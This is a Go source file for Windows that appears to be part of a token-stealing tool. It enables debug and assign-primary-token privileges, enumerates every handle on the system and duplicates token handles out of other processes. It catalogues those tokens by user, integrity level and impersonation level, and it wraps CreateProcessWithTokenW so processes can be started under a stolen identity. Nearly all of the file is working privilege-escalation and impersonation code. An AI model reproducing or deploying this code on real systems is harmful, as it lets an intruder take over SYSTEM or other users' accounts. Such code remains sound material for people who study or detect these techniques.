package token

import (
	"fmt"
	"sort"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modNtDll          = windows.NewLazySystemDLL("ntdll.dll")
	procNtQueryObject = modNtDll.NewProc("NtQueryObject")

	modadvapi32                 = syscall.NewLazyDLL("advapi32.dll")
	procDuplicateTokenEx        = modadvapi32.NewProc("DuplicateTokenEx")
	procCreateProcessWithTokenW = modadvapi32.NewProc("CreateProcessWithTokenW")

	modwtsapi32               = syscall.NewLazyDLL("wtsapi32.dll")
	procWTSEnumerateSessionsW = modwtsapi32.NewProc("WTSEnumerateSessionsW")
)

const (
	SYSTEM_HANDLE_INFORMATION_CLASS = 16
	STATUS_BUFFER_OVERFLOW          = 0x80000005
	STATUS_INFO_LENGTH_MISMATCH     = 0xC0000004
	STATUS_SUCCESS                  = 0x00000000

	MAXIMUM_ALLOWED              uint32 = 0x02000000
	ObjectTypeInformation               = 2
	SystemHandleInformationClass        = 16
	SystemHandleInformationSize         = uint32(1024 * 1024 * 10)

	PROCESS_ALL_ACCESS = 0x001F0FFF

	SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege"
	SE_DEBUG_NAME              = "SeDebugPrivilege"

	TokenPrimary                  = 1
	TokenImpersonation            = 2
	SECURITY_MANDATORY_LOW_RID    = 0x00001000
	SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
	SECURITY_MANDATORY_HIGH_RID   = 0x00003000
	SECURITY_MANDATORY_SYSTEM_RID = 0x00004000
	SecurityImpersonation         = 2
	SecurityDelegation            = 3
	SecurityAnonymous             = 0
	SecurityIdentification        = 1
)

type TOKEN_STATISTICS struct {
	TokenId            windows.LUID
	AuthenticationId   windows.LUID
	ExpirationTime     windows.Filetime
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedId         windows.LUID
}

type SID_AND_ATTRIBUTES struct {
	Sid        *windows.SID
	Attributes uint32
}

type TOKEN_MANDATORY_LABEL struct {
	Label SID_AND_ATTRIBUTES
}

type SECURITY_IMPERSONATION_LEVEL uint32

type TOKEN_INFO struct {
	FullName           string
	Integrity          string
	TokenType          string
	ImpersonationLevel string
	ProcessId          uint32
	Handle             windows.Handle
	ExpirationTime     time.Time
}

type SYSTEM_HANDLE_INFORMATION struct {
	NumberOfHandles uint32
	Handles         [1]SYSTEM_HANDLE_TABLE_ENTRY_INFO
}

type SYSTEM_HANDLE_TABLE_ENTRY_INFO struct {
	ProcessId             uint16
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       byte
	HandleAttributes      byte
	HandleValue           uint16
	Object                uintptr
	GrantedAccess         uint32
}

type OBJECT_TYPE_INFORMATION struct {
	TypeName UNICODE_STRING
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type OBJECT_INFORMATION_CLASS uint32

type OBJECT_NAME_INFORMATION struct {
	Name UNICODE_STRING
}

type WTS_SESSION_INFO struct {
	SessionID      windows.Handle
	WinStationName *uint16
	State          uint32
}

// https://www.reliaquest.com/blog/credential-dumping-part-2-how-to-mitigate-windows-credential-stealing/
// HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\TokenLeakDetectDelaySecs
func enablePrivilege(hToken windows.Token, privilegeName *uint16, displayName string) {
	var tp windows.Tokenprivileges
	tp.PrivilegeCount = 1

	err := windows.LookupPrivilegeValue(nil, privilegeName, &tp.Privileges[0].Luid)
	if err != nil {
		fmt.Printf("\t[!] %s not owned!\n", displayName)
		return
	}

	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err = windows.AdjustTokenPrivileges(hToken, false, (*windows.Tokenprivileges)(unsafe.Pointer(&tp)), uint32(unsafe.Sizeof(tp)), nil, nil)
	if err != nil {
		fmt.Printf("\t[!] %s adjust token failed: %v\n", displayName, err)
		return
	}
}

func SetupPrivilege() error {
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(windows.GetCurrentProcessId()))
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %v\n", err)
	}
	defer windows.CloseHandle(hProcess)

	var hToken windows.Token
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %v\n", err)
	}
	defer hToken.Close()

	enablePrivilege(hToken, windows.StringToUTF16Ptr(SE_ASSIGNPRIMARYTOKEN_NAME), "SeAssignPrimaryToken")
	enablePrivilege(hToken, windows.StringToUTF16Ptr(SE_DEBUG_NAME), "SeDebugPrivilege")
	return nil
}

func ListAllToken() ([]TOKEN_INFO, error) {
	currentProcess, err := syscall.GetCurrentProcess()
	if err != nil {
		return nil, fmt.Errorf("GetCurrentProcess failed: %v\n", err)
	}
	defer syscall.Close(currentProcess)

	handleTableInformation := make([]byte, SystemHandleInformationSize)
	var returnLength uint32

	err = windows.NtQuerySystemInformation(int32(SystemHandleInformationClass), unsafe.Pointer(unsafe.Pointer(&handleTableInformation[0])), SystemHandleInformationSize, &returnLength)
	if err != nil {
		return nil, fmt.Errorf("NtQuerySystemInformation failed: %v\n", err)
	}

	mapRemoveDup := make(map[string]bool, 0)
	var listToken []TOKEN_INFO

	pSystemProcessInfo := (*SYSTEM_HANDLE_INFORMATION)(unsafe.Pointer(&handleTableInformation[0]))
	handleTableEntrySize := unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO{})
	for i := 0; i < int(pSystemProcessInfo.NumberOfHandles); i++ {
		handleEntry := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(uintptr(unsafe.Pointer(&pSystemProcessInfo.Handles[0])) + uintptr(i)*handleTableEntrySize))
		process, err := windows.OpenProcess(windows.PROCESS_DUP_HANDLE, false, uint32(handleEntry.ProcessId))
		if err != nil || process == windows.InvalidHandle {
			continue
		}

		var dupHandle windows.Handle
		err = windows.DuplicateHandle(process, windows.Handle(handleEntry.HandleValue), windows.Handle(currentProcess), &dupHandle, 0, false, windows.DUPLICATE_SAME_ACCESS)
		if err != nil || dupHandle == windows.InvalidHandle {
			windows.CloseHandle(process)
			continue
		}

		name, err := GetObjectInfo(dupHandle, ObjectTypeInformation)
		if err != nil || name != "Token" {
			windows.CloseHandle(process)
			windows.CloseHandle(dupHandle)
			continue
		}

		tokenInfo := token2Info(windows.Token(dupHandle))
		tokenInfo.FullName = token2Username(windows.Token(dupHandle))
		if tokenInfo.FullName == "" {
			continue
		}

		tokenInfo.ProcessId = uint32(handleEntry.ProcessId)
		tokenInfo.Handle = dupHandle
		key := fmt.Sprintf("%s%s%s%s", tokenInfo.FullName, tokenInfo.ImpersonationLevel, tokenInfo.Integrity, tokenInfo.TokenType)
		_, found := mapRemoveDup[key]
		if found {
			windows.CloseHandle(dupHandle)
			continue
		}
		mapRemoveDup[key] = true
		listToken = append(listToken, tokenInfo)
	}

	// var currentSessionId1 uint32
	// currentProcessId := windows.GetCurrentProcessId()
	// err = windows.ProcessIdToSessionId(currentProcessId, &currentSessionId1)
	// if err != nil {
	// 	fmt.Printf("Failed to get current session ID: %v\n", err)
	// 	return
	// }
	sort.Slice(listToken, func(i, j int) bool {
		return listToken[i].FullName < listToken[j].FullName
	})

	return listToken, nil
}

func filetimeToTime(ft windows.Filetime) time.Time {
	return time.Unix(0, ft.Nanoseconds())
}

func WTSEnumerateSessions() ([]*WTS_SESSION_INFO, error) {
	var (
		sessionInformation windows.Handle      = windows.Handle(0)
		sessionCount       int                 = 0
		sessionList        []*WTS_SESSION_INFO = make([]*WTS_SESSION_INFO, 0)
	)

	if returnCode, _, err := procWTSEnumerateSessionsW.Call(0, 0, 1, uintptr(unsafe.Pointer(&sessionInformation)), uintptr(unsafe.Pointer(&sessionCount))); returnCode == 0 {
		return nil, fmt.Errorf("call native WTSEnumerateSessionsW: %s", err)
	}

	structSize := unsafe.Sizeof(WTS_SESSION_INFO{})
	current := uintptr(sessionInformation)
	for i := 0; i < sessionCount; i++ {
		sessionList = append(sessionList, (*WTS_SESSION_INFO)(unsafe.Pointer(current)))
		current += structSize
	}

	return sessionList, nil
}

func GetCurrentSessionId() (uint32, error) {
	var sessionId uint32 = 0xFFFFFFFF

	sessionList, err := WTSEnumerateSessions()
	if err != nil {
		return sessionId, err
	}

	for i := range sessionList {
		if sessionList[i].State == 0 {
			sessionId = uint32(sessionList[i].SessionID)
		}
	}

	return sessionId, err
}

func CreateProcessWithTokenW(token windows.Handle, logonFlags uint32, applicationName *uint16, commandLine *uint16, creationFlags uint32, environment *uint16, currentDirectory *uint16, startupInfo *syscall.StartupInfo, processInformation *syscall.ProcessInformation) error {
	r1, _, e1 := syscall.Syscall9(procCreateProcessWithTokenW.Addr(), 9,
		uintptr(token),
		uintptr(logonFlags),
		uintptr(unsafe.Pointer(applicationName)),
		uintptr(unsafe.Pointer(commandLine)),
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(environment)),
		uintptr(unsafe.Pointer(currentDirectory)),
		uintptr(unsafe.Pointer(startupInfo)),
		uintptr(unsafe.Pointer(processInformation)))
	if r1 == 0 {
		if e1 != 0 {
			return error(e1)
		} else {
			return syscall.EINVAL
		}
	}
	return nil
}

func token2Info(handle windows.Token) (info TOKEN_INFO) {
	var cbSize uint32
	err := windows.GetTokenInformation(handle, windows.TokenStatistics, nil, 0, &cbSize)
	if err != syscall.ERROR_INSUFFICIENT_BUFFER {
		return
	}

	tokenInfo := make([]byte, cbSize)
	err = windows.GetTokenInformation(handle, windows.TokenStatistics, &tokenInfo[0], cbSize, &cbSize)
	if err != nil {
		fmt.Printf("Failed to get token information: %v\n", err)
		return
	}

	tokenStatisticsInformation := (*TOKEN_STATISTICS)(unsafe.Pointer(&tokenInfo[0]))
	info.ExpirationTime = filetimeToTime(tokenStatisticsInformation.ExpirationTime)

	if tokenStatisticsInformation.TokenType == TokenPrimary {
		info.TokenType = "TokenPrimary"
		err = windows.GetTokenInformation(handle, windows.TokenIntegrityLevel, nil, 0, &cbSize)
		if err != syscall.ERROR_INSUFFICIENT_BUFFER {
			fmt.Printf("Failed to get token information size: %v\n", err)
			return
		}

		tokenIntegrity := make([]byte, cbSize)
		err = windows.GetTokenInformation(handle, windows.TokenIntegrityLevel, &tokenIntegrity[0], cbSize, &cbSize)
		if err != nil {
			fmt.Printf("Failed to get token information: %v\n", err)
			return
		}
		tokenIntegrityLevel := (*TOKEN_MANDATORY_LABEL)(unsafe.Pointer(&tokenIntegrity[0]))
		sid := tokenIntegrityLevel.Label.Sid
		sidCount := *(*uint8)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + 1))
		subAuthorityIndex := uint32(sidCount - 1)
		dwIntegrityLevel := *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(sid)) + 8 + uintptr(subAuthorityIndex)*4))

		switch dwIntegrityLevel {
		case SECURITY_MANDATORY_LOW_RID:
			info.Integrity = "Low"
		case SECURITY_MANDATORY_MEDIUM_RID:
			info.Integrity = "Medium"
		case SECURITY_MANDATORY_HIGH_RID:
			info.Integrity = "High"
		case SECURITY_MANDATORY_SYSTEM_RID:
			info.Integrity = "System"
		}

	} else if tokenStatisticsInformation.TokenType == TokenImpersonation {
		info.TokenType = "TokenImpersonation"
		err = windows.GetTokenInformation(handle, windows.TokenImpersonationLevel, nil, 0, &cbSize)
		if err != syscall.ERROR_INSUFFICIENT_BUFFER {
			fmt.Printf("Failed to get token information size: %v\n", err)
			return
		}

		tokenImpersonation := make([]byte, cbSize)
		err = windows.GetTokenInformation(handle, windows.TokenImpersonationLevel, &tokenImpersonation[0], cbSize, &cbSize)
		if err != nil {
			fmt.Printf("Failed to get token information: %v\n", err)
			return
		}
		tokenImpersonationLevel := (*SECURITY_IMPERSONATION_LEVEL)(unsafe.Pointer(&tokenImpersonation[0]))

		switch *tokenImpersonationLevel {
		case SecurityImpersonation:
			info.ImpersonationLevel = "SecurityImpersonation"
		case SecurityDelegation:
			info.ImpersonationLevel = "SecurityDelegation"
		case SecurityAnonymous:
			info.ImpersonationLevel = "SecurityAnonymous"
		case SecurityIdentification:
			info.ImpersonationLevel = "SecurityIdentification"
		}
	}
	return
}

func token2Username(handle windows.Token) string {
	var cbSize uint32
	err := windows.GetTokenInformation(handle, windows.TokenUser, nil, 0, &cbSize)
	if err != syscall.ERROR_INSUFFICIENT_BUFFER {
		return ""
	}

	tokenInfo := make([]byte, cbSize)
	err = windows.GetTokenInformation(handle, windows.TokenUser, &tokenInfo[0], cbSize, &cbSize)
	if err != nil {
		fmt.Printf("Failed to get token information: %v\n", err)
		return ""
	}
	var user windows.Tokenuser
	userPtr := (*windows.Tokenuser)(unsafe.Pointer(&tokenInfo[0]))
	user = *userPtr

	var username [256]uint16
	var domain [256]uint16
	var userLength, domainLength uint32 = 256, 256
	var sidNameUse uint32
	err = windows.LookupAccountSid(nil, user.User.Sid, &username[0], &userLength, &domain[0], &domainLength, &sidNameUse)
	if err != nil {
		fmt.Printf("Failed to lookup account: %v\n", err)
		return ""
	}

	fullName := syscall.UTF16ToString(domain[:domainLength]) + "/" + syscall.UTF16ToString(username[:userLength])
	return fullName
}

func GetObjectInfo(hObject windows.Handle, objInfoClass uint32) (string, error) {
	var returnLength uint32
	buffer := make([]byte, 8192)

	ntStatus := ntQueryObject(hObject, objInfoClass, &buffer[0], uint32(len(buffer)), &returnLength)
	if ntStatus != 0 {
		return "", fmt.Errorf("NtQueryObject failed with status: 0x%x", ntStatus)
	}

	objectTypeInfo := (*OBJECT_TYPE_INFORMATION)(unsafe.Pointer(&buffer[0]))

	typeName := windows.UTF16PtrToString(objectTypeInfo.TypeName.Buffer)

	return typeName, nil
}

func ntQueryObject(hObject windows.Handle, objInfoClass uint32, pObjectInfo *byte, dwSize uint32, returnSize *uint32) uint32 {
	r1, _, _ := procNtQueryObject.Call(
		uintptr(hObject),
		uintptr(objInfoClass),
		uintptr(unsafe.Pointer(pObjectInfo)),
		uintptr(dwSize),
		uintptr(unsafe.Pointer(returnSize)),
	)
	return uint32(r1)
}
